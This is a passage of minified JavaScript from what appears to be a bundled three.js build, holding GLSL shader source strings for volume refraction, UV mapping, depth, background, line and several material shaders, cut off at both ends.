			g1( fuv.y ) * ( g0x * textureLod( tex, p2, lod ) + g1x * textureLod( tex, p3, lod ) );
	}
	vec4 textureBicubic( sampler2D sampler, vec2 uv, float lod ) {
		vec2 fLodSize = vec2( textureSize( sampler, int( lod ) ) );
		vec2 cLodSize = vec2( textureSize( sampler, int( lod + 1.0 ) ) );
		vec2 fLodSizeInv = 1.0 / fLodSize;
		vec2 cLodSizeInv = 1.0 / cLodSize;
		vec4 fSample = bicubic( sampler, uv, vec4( fLodSizeInv, fLodSize ), floor( lod ) );
		vec4 cSample = bicubic( sampler, uv, vec4( cLodSizeInv, cLodSize ), ceil( lod ) );
		return mix( fSample, cSample, fract( lod ) );
	}
	vec3 getVolumeTransmissionRay( const in vec3 n, const in vec3 v, const in float thickness, const in float ior, const in mat4 modelMatrix ) {
		vec3 refractionVector = refract( - v, normalize( n ), 1.0 / ior );
		vec3 modelScale;
		modelScale.x = length( vec3( modelMatrix[ 0 ].xyz ) );
		modelScale.y = length( vec3( modelMatrix[ 1 ].xyz ) );
		modelScale.z = length( vec3( modelMatrix[ 2 ].xyz ) );
		return normalize( refractionVector ) * thickness * modelScale;
	}
	float applyIorToRoughness( const in float roughness, const in float ior ) {
		return roughness * clamp( ior * 2.0 - 2.0, 0.0, 1.0 );
	}
	vec4 getTransmissionSample( const in vec2 fragCoord, const in float roughness, const in float ior ) {
		float lod = log2( transmissionSamplerSize.x ) * applyIorToRoughness( roughness, ior );
		return textureBicubic( transmissionSamplerMap, fragCoord.xy, lod );
	}
	vec3 volumeAttenuation( const in float transmissionDistance, const in vec3 attenuationColor, const in float attenuationDistance ) {
		if ( isinf( attenuationDistance ) ) {
			return vec3( 1.0 );
		} else {
			vec3 attenuationCoefficient = -log( attenuationColor ) / attenuationDistance;
			vec3 transmittance = exp( - attenuationCoefficient * transmissionDistance );			return transmittance;
		}
	}
	vec4 getIBLVolumeRefraction( const in vec3 n, const in vec3 v, const in float roughness, const in vec3 diffuseColor,
		const in vec3 specularColor, const in float specularF90, const in vec3 position, const in mat4 modelMatrix,
		const in mat4 viewMatrix, const in mat4 projMatrix, const in float dispersion, const in float ior, const in float thickness,
		const in vec3 attenuationColor, const in float attenuationDistance ) {
		vec4 transmittedLight;
		vec3 transmittance;
		#ifdef USE_DISPERSION
			float halfSpread = ( ior - 1.0 ) * 0.025 * dispersion;
			vec3 iors = vec3( ior - halfSpread, ior, ior + halfSpread );
			for ( int i = 0; i < 3; i ++ ) {
				vec3 transmissionRay = getVolumeTransmissionRay( n, v, thickness, iors[ i ], modelMatrix );
				vec3 refractedRayExit = position + transmissionRay;
				vec4 ndcPos = projMatrix * viewMatrix * vec4( refractedRayExit, 1.0 );
				vec2 refractionCoords = ndcPos.xy / ndcPos.w;
				refractionCoords += 1.0;
				refractionCoords /= 2.0;
				vec4 transmissionSample = getTransmissionSample( refractionCoords, roughness, iors[ i ] );
				transmittedLight[ i ] = transmissionSample[ i ];
				transmittedLight.a += transmissionSample.a;
				transmittance[ i ] = diffuseColor[ i ] * volumeAttenuation( length( transmissionRay ), attenuationColor, attenuationDistance )[ i ];
			}
			transmittedLight.a /= 3.0;
		#else
			vec3 transmissionRay = getVolumeTransmissionRay( n, v, thickness, ior, modelMatrix );
			vec3 refractedRayExit = position + transmissionRay;
			vec4 ndcPos = projMatrix * viewMatrix * vec4( refractedRayExit, 1.0 );
			vec2 refractionCoords = ndcPos.xy / ndcPos.w;
			refractionCoords += 1.0;
			refractionCoords /= 2.0;
			transmittedLight = getTransmissionSample( refractionCoords, roughness, ior );
			transmittance = diffuseColor * volumeAttenuation( length( transmissionRay ), attenuationColor, attenuationDistance );
		#endif
		vec3 attenuatedColor = transmittance * transmittedLight.rgb;
		vec3 F = EnvironmentBRDF( n, v, specularColor, specularF90, roughness );
		float transmittanceFactor = ( transmittance.r + transmittance.g + transmittance.b ) / 3.0;
		return vec4( ( 1.0 - F ) * attenuatedColor, 1.0 - ( 1.0 - transmittedLight.a ) * transmittanceFactor );
	}
#endif`,P1=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	varying vec2 vUv;
#endif
#ifdef USE_MAP
	varying vec2 vMapUv;
#endif
#ifdef USE_ALPHAMAP
	varying vec2 vAlphaMapUv;
#endif
#ifdef USE_LIGHTMAP
	varying vec2 vLightMapUv;
#endif
#ifdef USE_AOMAP
	varying vec2 vAoMapUv;
#endif
#ifdef USE_BUMPMAP
	varying vec2 vBumpMapUv;
#endif
#ifdef USE_NORMALMAP
	varying vec2 vNormalMapUv;
#endif
#ifdef USE_EMISSIVEMAP
	varying vec2 vEmissiveMapUv;
#endif
#ifdef USE_METALNESSMAP
	varying vec2 vMetalnessMapUv;
#endif
#ifdef USE_ROUGHNESSMAP
	varying vec2 vRoughnessMapUv;
#endif
#ifdef USE_ANISOTROPYMAP
	varying vec2 vAnisotropyMapUv;
#endif
#ifdef USE_CLEARCOATMAP
	varying vec2 vClearcoatMapUv;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	varying vec2 vClearcoatNormalMapUv;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	varying vec2 vClearcoatRoughnessMapUv;
#endif
#ifdef USE_IRIDESCENCEMAP
	varying vec2 vIridescenceMapUv;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	varying vec2 vIridescenceThicknessMapUv;
#endif
#ifdef USE_SHEEN_COLORMAP
	varying vec2 vSheenColorMapUv;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	varying vec2 vSheenRoughnessMapUv;
#endif
#ifdef USE_SPECULARMAP
	varying vec2 vSpecularMapUv;
#endif
#ifdef USE_SPECULAR_COLORMAP
	varying vec2 vSpecularColorMapUv;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	varying vec2 vSpecularIntensityMapUv;
#endif
#ifdef USE_TRANSMISSIONMAP
	uniform mat3 transmissionMapTransform;
	varying vec2 vTransmissionMapUv;
#endif
#ifdef USE_THICKNESSMAP
	uniform mat3 thicknessMapTransform;
	varying vec2 vThicknessMapUv;
#endif`,I1=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	varying vec2 vUv;
#endif
#ifdef USE_MAP
	uniform mat3 mapTransform;
	varying vec2 vMapUv;
#endif
#ifdef USE_ALPHAMAP
	uniform mat3 alphaMapTransform;
	varying vec2 vAlphaMapUv;
#endif
#ifdef USE_LIGHTMAP
	uniform mat3 lightMapTransform;
	varying vec2 vLightMapUv;
#endif
#ifdef USE_AOMAP
	uniform mat3 aoMapTransform;
	varying vec2 vAoMapUv;
#endif
#ifdef USE_BUMPMAP
	uniform mat3 bumpMapTransform;
	varying vec2 vBumpMapUv;
#endif
#ifdef USE_NORMALMAP
	uniform mat3 normalMapTransform;
	varying vec2 vNormalMapUv;
#endif
#ifdef USE_DISPLACEMENTMAP
	uniform mat3 displacementMapTransform;
	varying vec2 vDisplacementMapUv;
#endif
#ifdef USE_EMISSIVEMAP
	uniform mat3 emissiveMapTransform;
	varying vec2 vEmissiveMapUv;
#endif
#ifdef USE_METALNESSMAP
	uniform mat3 metalnessMapTransform;
	varying vec2 vMetalnessMapUv;
#endif
#ifdef USE_ROUGHNESSMAP
	uniform mat3 roughnessMapTransform;
	varying vec2 vRoughnessMapUv;
#endif
#ifdef USE_ANISOTROPYMAP
	uniform mat3 anisotropyMapTransform;
	varying vec2 vAnisotropyMapUv;
#endif
#ifdef USE_CLEARCOATMAP
	uniform mat3 clearcoatMapTransform;
	varying vec2 vClearcoatMapUv;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	uniform mat3 clearcoatNormalMapTransform;
	varying vec2 vClearcoatNormalMapUv;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	uniform mat3 clearcoatRoughnessMapTransform;
	varying vec2 vClearcoatRoughnessMapUv;
#endif
#ifdef USE_SHEEN_COLORMAP
	uniform mat3 sheenColorMapTransform;
	varying vec2 vSheenColorMapUv;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	uniform mat3 sheenRoughnessMapTransform;
	varying vec2 vSheenRoughnessMapUv;
#endif
#ifdef USE_IRIDESCENCEMAP
	uniform mat3 iridescenceMapTransform;
	varying vec2 vIridescenceMapUv;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	uniform mat3 iridescenceThicknessMapTransform;
	varying vec2 vIridescenceThicknessMapUv;
#endif
#ifdef USE_SPECULARMAP
	uniform mat3 specularMapTransform;
	varying vec2 vSpecularMapUv;
#endif
#ifdef USE_SPECULAR_COLORMAP
	uniform mat3 specularColorMapTransform;
	varying vec2 vSpecularColorMapUv;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	uniform mat3 specularIntensityMapTransform;
	varying vec2 vSpecularIntensityMapUv;
#endif
#ifdef USE_TRANSMISSIONMAP
	uniform mat3 transmissionMapTransform;
	varying vec2 vTransmissionMapUv;
#endif
#ifdef USE_THICKNESSMAP
	uniform mat3 thicknessMapTransform;
	varying vec2 vThicknessMapUv;
#endif`,z1=`#if defined( USE_UV ) || defined( USE_ANISOTROPY )
	vUv = vec3( uv, 1 ).xy;
#endif
#ifdef USE_MAP
	vMapUv = ( mapTransform * vec3( MAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ALPHAMAP
	vAlphaMapUv = ( alphaMapTransform * vec3( ALPHAMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_LIGHTMAP
	vLightMapUv = ( lightMapTransform * vec3( LIGHTMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_AOMAP
	vAoMapUv = ( aoMapTransform * vec3( AOMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_BUMPMAP
	vBumpMapUv = ( bumpMapTransform * vec3( BUMPMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_NORMALMAP
	vNormalMapUv = ( normalMapTransform * vec3( NORMALMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_DISPLACEMENTMAP
	vDisplacementMapUv = ( displacementMapTransform * vec3( DISPLACEMENTMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_EMISSIVEMAP
	vEmissiveMapUv = ( emissiveMapTransform * vec3( EMISSIVEMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_METALNESSMAP
	vMetalnessMapUv = ( metalnessMapTransform * vec3( METALNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ROUGHNESSMAP
	vRoughnessMapUv = ( roughnessMapTransform * vec3( ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_ANISOTROPYMAP
	vAnisotropyMapUv = ( anisotropyMapTransform * vec3( ANISOTROPYMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOATMAP
	vClearcoatMapUv = ( clearcoatMapTransform * vec3( CLEARCOATMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOAT_NORMALMAP
	vClearcoatNormalMapUv = ( clearcoatNormalMapTransform * vec3( CLEARCOAT_NORMALMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_CLEARCOAT_ROUGHNESSMAP
	vClearcoatRoughnessMapUv = ( clearcoatRoughnessMapTransform * vec3( CLEARCOAT_ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_IRIDESCENCEMAP
	vIridescenceMapUv = ( iridescenceMapTransform * vec3( IRIDESCENCEMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_IRIDESCENCE_THICKNESSMAP
	vIridescenceThicknessMapUv = ( iridescenceThicknessMapTransform * vec3( IRIDESCENCE_THICKNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SHEEN_COLORMAP
	vSheenColorMapUv = ( sheenColorMapTransform * vec3( SHEEN_COLORMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SHEEN_ROUGHNESSMAP
	vSheenRoughnessMapUv = ( sheenRoughnessMapTransform * vec3( SHEEN_ROUGHNESSMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULARMAP
	vSpecularMapUv = ( specularMapTransform * vec3( SPECULARMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULAR_COLORMAP
	vSpecularColorMapUv = ( specularColorMapTransform * vec3( SPECULAR_COLORMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_SPECULAR_INTENSITYMAP
	vSpecularIntensityMapUv = ( specularIntensityMapTransform * vec3( SPECULAR_INTENSITYMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_TRANSMISSIONMAP
	vTransmissionMapUv = ( transmissionMapTransform * vec3( TRANSMISSIONMAP_UV, 1 ) ).xy;
#endif
#ifdef USE_THICKNESSMAP
	vThicknessMapUv = ( thicknessMapTransform * vec3( THICKNESSMAP_UV, 1 ) ).xy;
#endif`,B1=`#if defined( USE_ENVMAP ) || defined( DISTANCE ) || defined ( USE_SHADOWMAP ) || defined ( USE_TRANSMISSION ) || NUM_SPOT_LIGHT_COORDS > 0
	vec4 worldPosition = vec4( transformed, 1.0 );
	#ifdef USE_BATCHING
		worldPosition = batchingMatrix * worldPosition;
	#endif
	#ifdef USE_INSTANCING
		worldPosition = instanceMatrix * worldPosition;
	#endif
	worldPosition = modelMatrix * worldPosition;
#endif`;const F1=`varying vec2 vUv;
uniform mat3 uvTransform;
void main() {
	vUv = ( uvTransform * vec3( uv, 1 ) ).xy;
	gl_Position = vec4( position.xy, 1.0, 1.0 );
}`,H1=`uniform sampler2D t2D;
uniform float backgroundIntensity;
varying vec2 vUv;
void main() {
	vec4 texColor = texture2D( t2D, vUv );
	#ifdef DECODE_VIDEO_TEXTURE
		texColor = vec4( mix( pow( texColor.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), texColor.rgb * 0.0773993808, vec3( lessThanEqual( texColor.rgb, vec3( 0.04045 ) ) ) ), texColor.w );
	#endif
	texColor.rgb *= backgroundIntensity;
	gl_FragColor = texColor;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,G1=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
	gl_Position.z = gl_Position.w;
}`,V1=`#ifdef ENVMAP_TYPE_CUBE
	uniform samplerCube envMap;
#elif defined( ENVMAP_TYPE_CUBE_UV )
	uniform sampler2D envMap;
#endif
uniform float backgroundBlurriness;
uniform float backgroundIntensity;
uniform mat3 backgroundRotation;
varying vec3 vWorldDirection;
#include <cube_uv_reflection_fragment>
void main() {
	#ifdef ENVMAP_TYPE_CUBE
		vec4 texColor = textureCube( envMap, backgroundRotation * vWorldDirection );
	#elif defined( ENVMAP_TYPE_CUBE_UV )
		vec4 texColor = textureCubeUV( envMap, backgroundRotation * vWorldDirection, backgroundBlurriness );
	#else
		vec4 texColor = vec4( 0.0, 0.0, 0.0, 1.0 );
	#endif
	texColor.rgb *= backgroundIntensity;
	gl_FragColor = texColor;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,X1=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
	gl_Position.z = gl_Position.w;
}`,k1=`uniform samplerCube tCube;
uniform float tFlip;
uniform float opacity;
varying vec3 vWorldDirection;
void main() {
	vec4 texColor = textureCube( tCube, vec3( tFlip * vWorldDirection.x, vWorldDirection.yz ) );
	gl_FragColor = texColor;
	gl_FragColor.a *= opacity;
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,W1=`#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
varying vec2 vHighPrecisionZW;
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <skinbase_vertex>
	#include <morphinstance_vertex>
	#ifdef USE_DISPLACEMENTMAP
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vHighPrecisionZW = gl_Position.zw;
}`,q1=`#if DEPTH_PACKING == 3200
	uniform float opacity;
#endif
#include <common>
#include <packing>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
varying vec2 vHighPrecisionZW;
void main() {
	vec4 diffuseColor = vec4( 1.0 );
	#include <clipping_planes_fragment>
	#if DEPTH_PACKING == 3200
		diffuseColor.a = opacity;
	#endif
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <logdepthbuf_fragment>
	#ifdef USE_REVERSED_DEPTH_BUFFER
		float fragCoordZ = vHighPrecisionZW[ 0 ] / vHighPrecisionZW[ 1 ];
	#else
		float fragCoordZ = 0.5 * vHighPrecisionZW[ 0 ] / vHighPrecisionZW[ 1 ] + 0.5;
	#endif
	#if DEPTH_PACKING == 3200
		gl_FragColor = vec4( vec3( 1.0 - fragCoordZ ), opacity );
	#elif DEPTH_PACKING == 3201
		gl_FragColor = packDepthToRGBA( fragCoordZ );
	#elif DEPTH_PACKING == 3202
		gl_FragColor = vec4( packDepthToRGB( fragCoordZ ), 1.0 );
	#elif DEPTH_PACKING == 3203
		gl_FragColor = vec4( packDepthToRG( fragCoordZ ), 0.0, 1.0 );
	#endif
}`,Y1=`#define DISTANCE
varying vec3 vWorldPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <skinbase_vertex>
	#include <morphinstance_vertex>
	#ifdef USE_DISPLACEMENTMAP
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <worldpos_vertex>
	#include <clipping_planes_vertex>
	vWorldPosition = worldPosition.xyz;
}`,Z1=`#define DISTANCE
uniform vec3 referencePosition;
uniform float nearDistance;
uniform float farDistance;
varying vec3 vWorldPosition;
#include <common>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( 1.0 );
	#include <clipping_planes_fragment>
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	float dist = length( vWorldPosition - referencePosition );
	dist = ( dist - nearDistance ) / ( farDistance - nearDistance );
	dist = saturate( dist );
	gl_FragColor = vec4( dist, 0.0, 0.0, 1.0 );
}`,K1=`varying vec3 vWorldDirection;
#include <common>
void main() {
	vWorldDirection = transformDirection( position, modelMatrix );
	#include <begin_vertex>
	#include <project_vertex>
}`,j1=`uniform sampler2D tEquirect;
varying vec3 vWorldDirection;
#include <common>
void main() {
	vec3 direction = normalize( vWorldDirection );
	vec2 sampleUV = equirectUv( direction );
	gl_FragColor = texture2D( tEquirect, sampleUV );
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
}`,Q1=`uniform float scale;
attribute float lineDistance;
varying float vLineDistance;
#include <common>
#include <uv_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	vLineDistance = scale * lineDistance;
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
}`,J1=`uniform vec3 diffuse;
uniform float opacity;
uniform float dashSize;
uniform float totalSize;
varying float vLineDistance;
#include <common>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	if ( mod( vLineDistance, totalSize ) > dashSize ) {
		discard;
	}
	vec3 outgoingLight = vec3( 0.0 );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
}`,$1=`#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#if defined ( USE_ENVMAP ) || defined ( USE_SKINNING )
		#include <beginnormal_vertex>
		#include <morphnormal_vertex>
		#include <skinbase_vertex>
		#include <skinnormal_vertex>
		#include <defaultnormal_vertex>
	#endif
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <fog_vertex>
}`,tA=`uniform vec3 diffuse;
uniform float opacity;
#ifndef FLAT_SHADED
	varying vec3 vNormal;
#endif
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	#ifdef USE_LIGHTMAP
		vec4 lightMapTexel = texture2D( lightMap, vLightMapUv );
		reflectedLight.indirectDiffuse += lightMapTexel.rgb * lightMapIntensity * RECIPROCAL_PI;
	#else
		reflectedLight.indirectDiffuse += vec3( 1.0 );
	#endif
	#include <aomap_fragment>
	reflectedLight.indirectDiffuse *= diffuseColor.rgb;
	vec3 outgoingLight = reflectedLight.indirectDiffuse;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,eA=`#define LAMBERT
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,nA=`#define LAMBERT
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float opacity;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <cube_uv_reflection_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <envmap_physical_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_lambert_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_lambert_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,iA=`#define MATCAP
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <color_pars_vertex>
#include <displacementmap_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
	vViewPosition = - mvPosition.xyz;
}`,aA=`#define MATCAP
uniform vec3 diffuse;
uniform float opacity;
uniform sampler2D matcap;
varying vec3 vViewPosition;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <normal_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	vec3 viewDir = normalize( vViewPosition );
	vec3 x = normalize( vec3( viewDir.z, 0.0, - viewDir.x ) );
	vec3 y = cross( viewDir, x );
	vec2 uv = vec2( dot( x, normal ), dot( y, normal ) ) * 0.495 + 0.5;
	#ifdef USE_MATCAP
		vec4 matcapColor = texture2D( matcap, uv );
	#else
		vec4 matcapColor = vec4( vec3( mix( 0.2, 0.8, uv.y ) ), 1.0 );
	#endif
	vec3 outgoingLight = diffuseColor.rgb * matcapColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,rA=`#define NORMAL
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	varying vec3 vViewPosition;
#endif
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphinstance_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
